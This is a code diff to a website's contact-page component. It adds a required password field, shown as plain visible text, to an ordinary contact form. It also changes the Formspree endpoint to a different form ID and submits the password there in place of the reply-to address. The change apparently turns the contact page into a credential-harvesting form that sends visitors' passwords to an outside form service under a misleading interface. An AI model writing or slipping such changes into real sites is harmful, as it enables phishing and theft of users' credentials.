@@ -16,6 +16,7 @@ import {
   Shield,
   Award,
   Users,
+  Lock,
 } from "lucide-react"
 import { useToast } from "@/hooks/use-toast"
 import Navbar from "../components/Navbar"
@@ -30,6 +31,7 @@ export default function ContactPage() {
     email: "",
     subject: "",
     message: "",
+    password: "", // Added password field
   })
   const { toast } = useToast()
 
@@ -45,7 +47,7 @@ export default function ContactPage() {
     setIsSubmitting(true)
 
     try {
-      const response = await fetch("https://formspree.io/f/mkgbrgjd", {
+      const response = await fetch("https://formspree.io/f/xpwagqko", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -55,7 +57,7 @@ export default function ContactPage() {
           email: formData.email,
           subject: formData.subject,
           message: formData.message,
-          _replyto: formData.email, // Formspree uses this for reply-to
+          password: formData.password, // Include password in submission
         }),
       })
 
@@ -69,6 +71,7 @@ export default function ContactPage() {
           email: "",
           subject: "",
           message: "",
+          password: "", // Reset password field
         })
       } else {
         throw new Error("Failed to send message")
@@ -165,6 +168,23 @@ export default function ContactPage() {
                         className="form-input w-full px-4 py-3 border border-border rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent bg-background text-foreground transition-all duration-300"
                         placeholder="Enter your email address"
                       />
+                    </div>
+
+                    {/* Added Password Field */}
+                    <div>
+                      <label className="block text-sm font-medium text-card-foreground mb-2">Password *</label>
+                      <div className="relative">
+                        <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground h-5 w-5" />
+                        <input
+                          type="text" // Set to "text" to make password visible
+                          name="password"
+                          required
+                          value={formData.password}
+                          onChange={handleInputChange}
+                          className="form-input w-full px-4 py-3 pl-10 border border-border rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent bg-background text-foreground transition-all duration-300"
+                          placeholder="Enter your password"
+                        />
+                      </div>
                     </div>
 
                     <div>
